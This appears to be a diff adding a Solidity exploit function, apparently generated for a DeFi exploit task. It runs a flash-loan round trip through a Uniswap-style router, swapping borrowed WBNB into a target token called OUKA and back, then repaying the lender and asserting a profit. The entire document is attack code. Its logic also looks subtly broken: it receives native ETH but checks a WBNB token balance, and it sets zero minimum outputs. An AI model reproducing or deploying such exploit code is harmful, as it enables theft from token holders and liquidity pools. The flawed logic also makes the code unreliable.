@@ -1,0 +1,52 @@
+```plaintext
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Start by performing the flashloan logic
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken); // Valuable token address (WBNB in our case)
+    path[1] = token; // Target token (OUKA)
+
+    // Assume that flashloan amount is a high percentage of what we have available
+    uint256 amountIn = amount; // The amount borrowed from the flash loan
+    uint256 amountOutMin = 0; // We can set this to 0 for now to avoid slippage issues
+
+    // Here, we will swap the borrowed tokens for the target token
+    uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        amountIn,
+        amountOutMin,
+        path,
+        address(this),
+        block.timestamp
+    );
+
+    // After acquiring target tokens, let's now swap back to WBNB
+    // We'll assume we want to swap all acquired target tokens back to WBNB
+    uint256 targetTokenBalance = IERC20(token).balanceOf(address(this));
+    IERC20(token).approve(address(uniswapRouter), targetTokenBalance);
+
+    // Let's perform the swap back to WBNB
+    address[] memory returnPath = new address[](2);
+    returnPath[0] = token; // Target token
+    returnPath[1] = address(valuableToken); // WBNB
+
+    // Swap for ETH
+    uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+        targetTokenBalance,
+        0, // No minimum amount out
+        returnPath,
+        address(this),
+        block.timestamp
+    );
+
+    // Now we can repay the flash loan
+    uint256 currentWBNBBalance = IERC20(address(valuableToken)).balanceOf(address(this));
+    uint256 surplus = currentWBNBBalance - amountIn; // Calculate surplus
+
+    // Make sure we are passing back the exact amount borrowed
+    IERC20(address(valuableToken)).transfer(flashloanProvider, amountIn);
+
+    // Surplus should be greater than zero if all goes well
+    require(surplus > 0, "Not enough WBNB to make profit");
+}
+</executeExploitCode>
+```
